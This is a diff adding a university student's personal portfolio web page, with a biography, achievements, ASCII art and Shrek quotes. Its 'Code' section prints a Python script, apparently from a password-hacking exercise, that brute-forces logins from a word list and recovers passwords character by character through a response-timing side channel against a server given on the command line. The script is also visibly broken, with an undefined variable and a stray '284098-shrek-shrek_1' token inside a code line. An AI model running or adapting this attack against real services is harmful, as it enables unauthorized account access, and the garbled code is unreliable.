@@ -5,5 +5,163 @@
 </head>
 <body>
 
+
+	<section>
+		<h2 id="Navigator">Naviation</h2>
+		<nav>
+			<ul>
+				<li><a href="#Main">Main</a></li>
+				<li><a href="#AboutMe">About me</a></li>
+				<li><a href="#Achievements">My achievements</a></li>
+				<li><a href="#TotemAnimal">My totem animal</a></li>
+				<li><a href="#Code">Code</a></li>
+				<li><a href="#Quote">Quote</a></li>
+				<li><a href="#Formula">Formula</a></li>
+			</ul>
+		</nav>
+	</section>
+
+
+	<h1 id="Main">Portfolio by Novgorodtsev Nikita</h1>
+
+	<section>
+		<h2 id="AboutMe">About me</h2>
+		<p>My name is Novgorodtsev Nikita and I'm twenty. I studied from first to sixth grade at secondary school number 61. 
+			and from seventh to eleventh at Kirov Physics and Mathematics Lyceum. I entered in ITMO University in 2018 and I still
+			study here. 
+		</p>
+	</section>
+		
+	<section>
+		<h2 id="Achievements">My achievements</h2>
+		<ol>
+			<li>Graduated from the best lyceum in the city</li>
+			<li>I won a huge number of Olympiads, including the one in which I entered.</li>
+			<li>I went to a large number of sections, including:</li>
+			<ul>
+				<li>Boxing</li>
+				<li>Greco-Roman wrestling</li>
+				<li>dancing</li>
+			</ul>
+			<li>Graduated from a considerable number of courses on coursera</li>
+		</ol>
+	</section>
+
+	<section>
+		<h2 id="TotemAnimal">My totem animal</h2>
+		<pre>
+<!---   --->░░░░░░░░▄██▄░░░░░░▄▄░░
+<!---   --->░░░░░░░▐███▀░░░░░▄███▌
+<!---   --->░░▄▀░░▄█▀▀░░░░░░░░▀██░
+<!---   --->░█░░░██░░░░░░░░░░░░░░░
+<!---   --->█▌░░▐██░░▄██▌░░▄▄▄░░░▄
+<!---   --->██░░▐██▄░▀█▀░░░▀██░░▐▌
+<!---   --->██▄░▐███▄▄░░▄▄▄░▀▀░▄██
+<!---   --->▐███▄██████▄░▀░▄█████▌
+<!---   --->▐████████████▀▀██████░
+<!---   --->░▐████▀██████░░█████░░
+<!---   --->░░░▀▀▀░░█████▌░████▀░░
+<!---   --->░░░░░░░░░▀▀███░▀▀▀░░░░
+		</pre>	
+	</section>
+
+	<section>
+		<h2 id="Code">Code for which you are not ashamed</h2>
+		<pre>
+			<code>
+<!---   --->import datetime
+<!---   --->import itertools
+<!---   --->import json
+<!---   --->import socket
+<!---   --->import string
+<!---   --->import sys
+<!---   --->
+<!---   --->
+<!---   --->def get_login(_path):
+<!---   --->    with open(_path) as login_file:
+<!---   --->        for login in login_file:
+<!---   --->            yield login.replace('\n', '')
+<!---   --->
+<!---   --->
+<!---   --->def check_delay(_client, _login):
+<!---   --->    start = datetime.datetime.now()
+<!---   --->    _client.send(json.dumps(data).encode())
+<!---   --->    json.loads(_client.recv(1024).decode())
+<!---   --->    finish = datetime.datetime.now()
+<!---   --->    return finish - start
+<!---   --->
+<!---   --->
+<!---   --->def brute_login(_client, _path):
+<!---   --->    _client.connect(address)
+<!---   --->    data = {}
+<!---   --->    delay = check_delay(_client, '')
+<!---   --->    for login in get_login(_path):
+<!---   --->        data['login'] = login
+<!---   --->        data['password'] = ''
+<!---   --->        start = datetime.datetime.now()
+<!---   --->        _client.send(json.dumps(data).encode())
+<!---   --->        answer = json.loads(_client.recv(1024).decode())
+<!---   --->        finish = datetime.datetime.now()
+<!---   --->        current_delay = finish - start
+<!---   --->        if current_delay > delay:
+<!---   --->            return login
+
+
+<!---   --->def brute_password(_client, _login):
+<!---   --->    password = ''
+<!---   --->    data = {'login': _login, 'password': password}
+<!---   --->    delay = check_delay(_client, _login)
+<!---   --->    while True:
+<!---   --->        for current_password in selection_password(password):
+<!---   --->            data['password'] = current_password
+<!---   --->            start = datetime.datetime.now()
+<!---   --->            _client.send(json.dumps(data).encode())
+<!---   --->            answer = json.loads(_client.recv(2048).decode())
+<!---   --->            finish = datetime.datetime.now()
+<!---   --->            current_delay = finish - start
+<!---   --->            if answer['result'] == 'Connection success!':
+<!---   --->                return data
+<!---   --->            if current_delay > delay:
+<!---   --->                password = current_password
+<!---   --->                break
+
+
+<!---   --->def selection_password(_password):
+<!---   --->    current_password = str(_password)284098-shrek-shrek_1
+<!---   --->    for symbol in itertools.chain(string.ascii_letters, string.digits):
+<!---   --->        yield current_password + symbol
+
+
+<!---   --->def brute(_address, _path):
+<!---   --->    with socket.socket() as client:
+<!---   --->        login = brute_login(client, _path)
+<!---   --->        return brute_password(client, login)
+
+
+<!---   --->args = sys.argv
+<!---   --->address = (args[1], int(args[2]))
+<!---   --->answer = brute(address, '/home/noni/PycharmProjects/Password Hacker/Password Hacker/task/hacking/logins.txt')
+<!---   --->print(json.dumps(answer))
+			</code>
+		</pre>
+	</section>
+
+	<section>
+		<h2 id="Quote">Quote</h2>
+		<ul>
+			<img src="source/quotes1.jpg" height="480px" width="900px" >
+			<li><blockquote>—Фу, ну и чудище!</blockquote></li>
+			<img src="source/quotes2.jpg"height="480px" width="900px">
+			<li><blockquote>Не очень-то вежливо! Нормальный ослик.</blockquote></li>
+			<img src="source/quotes3.jpg"height="480px" width="900px">
+		</ul>
+		<p>Шрек</p>
+	</section>
+
+	<section>
+		<h2 id="Formula">The formula for success</h2>
+		<p>0<sup>0</sup></p>
+	</section>
+	
 </body>
 </html>
